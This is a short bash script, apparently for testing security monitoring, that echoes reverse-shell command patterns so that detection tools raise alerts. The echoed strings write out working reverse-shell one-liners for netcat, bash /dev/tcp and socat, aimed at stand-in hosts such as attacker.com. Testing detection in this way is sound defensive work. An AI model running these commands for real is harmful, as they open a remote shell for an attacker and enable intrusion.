#!/bin/bash
# Reverse Shell Simulator
# Simulates common reverse shell patterns without actually creating connections

echo "🔴 Reverse Shell Pattern Simulator"
echo "=================================="
echo ""

# Test 1: Netcat reverse shell pattern
echo "[Test 1] Netcat reverse shell pattern"
bash -c 'echo "Simulating: nc -e /bin/bash attacker.com 4444"'
sleep 2

# Test 2: Bash /dev/tcp reverse shell
echo "[Test 2] Bash /dev/tcp reverse shell"
bash -c 'echo "Simulating: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"'
sleep 2

# Test 3: Python reverse shell
echo "[Test 3] Python reverse shell pattern"
python3 -c 'print("Simulating: python reverse shell")'
sleep 2

# Test 4: Perl reverse shell
echo "[Test 4] Perl reverse shell pattern"
perl -e 'print "Simulating: perl reverse shell\n"'
sleep 2

# Test 5: Socat reverse shell
echo "[Test 5] Socat reverse shell pattern"
bash -c 'echo "Simulating: socat exec:bash tcp:attacker.com:443"'
sleep 2

echo ""
echo "✅ Reverse shell patterns simulated"
echo "   Expected: HIGH severity alerts for suspicious command patterns"
